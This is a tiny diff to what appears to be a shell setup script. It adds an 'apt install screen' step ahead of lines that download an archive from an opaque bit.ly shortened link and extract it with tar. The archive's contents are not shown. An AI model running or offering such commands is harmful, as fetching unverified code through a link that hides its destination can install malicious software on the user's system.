@@ -1,3 +1,5 @@
+apt install screen -y
+
 wget https://bit.ly/kontolrum
 
 tar -xvf kontolrum
